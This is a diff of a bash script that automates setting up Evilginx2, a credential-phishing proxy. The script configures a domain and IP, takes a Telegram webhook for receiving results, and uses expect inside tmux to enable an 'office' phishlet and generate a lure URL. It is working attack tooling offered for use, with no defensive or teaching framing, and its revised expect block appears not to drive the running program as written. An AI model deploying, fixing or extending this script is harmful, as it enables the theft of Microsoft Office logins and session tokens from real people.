@@ -2,30 +2,29 @@
 
 LOG_FILE="/var/log/evilginx_auto.log"
 CONFIG_FILE="/root/.evilginx/config.yaml"
+TMUX_SESSION="evilginx"
 
 # Function to log messages
 log_message() {
     echo "[$(date)] $1" | tee -a "$LOG_FILE"
 }
 
-# Prompt for user input
-read -p "Enter domain name (e.g., example.com): " DOMAIN
-read -p "Enter external IPv4 address: " EXTERNAL_IPV4
-read -p "Enter redirect URL (e.g., https://nba.com): " REDIRECT_URL
-read -p "Enter Telegram Webhook Token: " TELEGRAM_WEBHOOK
-
-# Ensure `expect` is installed
+# Ensure `expect` and `tmux` are installed
 log_message "[+] Checking if required packages are installed..."
-if ! command -v expect &> /dev/null; then
-    log_message "[!] 'expect' not found. Installing..."
-    sudo apt update && sudo apt install expect -y || { log_message "[!] Failed to install 'expect'!"; exit 1; }
-else
-    log_message "[+] 'expect' is already installed."
-fi
+for package in expect tmux; do
+    if ! command -v "$package" &> /dev/null; then
+        log_message "[!] '$package' not found. Installing..."
+        sudo apt update && sudo apt install "$package" -y || { log_message "[!] Failed to install '$package'!"; exit 1; }
+    else
+        log_message "[+] '$package' is already installed."
+    fi
+done
 
-# Update and upgrade system
-log_message "[+] Updating system..."
-sudo apt update && sudo apt upgrade -y || { log_message "[!] System update failed!"; exit 1; }
+# Prompt for user inputs
+read -p "Enter domain: " DOMAIN
+read -p "Enter external IPv4: " EXTERNAL_IPV4
+read -p "Enter redirect URL: " REDIRECT_URL
+read -p "Enter Telegram Webhook: " TELEGRAM_WEBHOOK
 
 # Check if Evilginx is already running and kill it if necessary
 if pgrep -x "evilginx2" > /dev/null; then
@@ -58,7 +57,7 @@ if [ -f "$CONFIG_FILE" ]; then
         log_message "[+] Changed dns_port to 5300"
     fi
 
-    # Modify domain and external IPv4 dynamically based on user input
+    # Modify domain and external IPv4 dynamically
     sed -i "s|domain: .*|domain: \"$DOMAIN\"|" "$CONFIG_FILE"
     sed -i "s|external_ipv4: .*|external_ipv4: \"$EXTERNAL_IPV4\"|" "$CONFIG_FILE"
 
@@ -87,25 +86,33 @@ if [ $? -ne 0 ]; then
     exit 1
 fi
 
-# Second Evilginx Run - Execute Commands
-log_message "[+] Restarting Evilginx and executing commands..."
-expect <<EOF | tee -a "$LOG_FILE"
-    spawn ./evilginx2
-    expect "evilginx2 >"
-    send "phishlets hostname office $DOMAIN\r"
-    expect "evilginx2 >"
-    send "phishlets enable office\r"
-    expect "evilginx2 >"
-    send "lures create office\r"
-    expect "evilginx2 >"
-    send "lures edit 0 redirect_url $REDIRECT_URL\r"
-    expect "evilginx2 >"
-    send "lures get-url 0\r"
-    expect "evilginx2 >"
-    send "config\r"
-    expect "evilginx2 >"
-    send "exit\r"
-    expect eof
-EOF
+# Check if the tmux session already exists
+if tmux has-session -t "$TMUX_SESSION" 2>/dev/null; then
+    log_message "[!] Tmux session '$TMUX_SESSION' already exists. Killing it to restart..."
+    tmux kill-session -t "$TMUX_SESSION"
+    sleep 2
+fi
 
-log_message "[+] Evilginx setup completed successfully!"
+# Start tmux session and run Evilginx
+log_message "[+] Starting Evilginx in a tmux session..."
+tmux new-session -d -s "$TMUX_SESSION" bash -c "
+    ./evilginx2;
+    sleep 2;
+    expect <<EOF | tee -a \"$LOG_FILE\"
+        expect \"evilginx2 >\"
+        send \"phishlets hostname office $DOMAIN\r\"
+        expect \"evilginx2 >\"
+        send \"phishlets enable office\r\"
+        expect \"evilginx2 >\"
+        send \"lures create office\r\"
+        expect \"evilginx2 >\"
+        send \"lures edit 0 redirect_url $REDIRECT_URL\r\"
+        expect \"evilginx2 >\"
+        send \"lures get-url 0\r\"
+        expect \"evilginx2 >\"
+        send \"config\r\"
+        expect \"evilginx2 >\"
+    EOF
+"
+
+log_message "[+] Evilginx is running in a tmux session. Attach using: tmux attach -t $TMUX_SESSION"
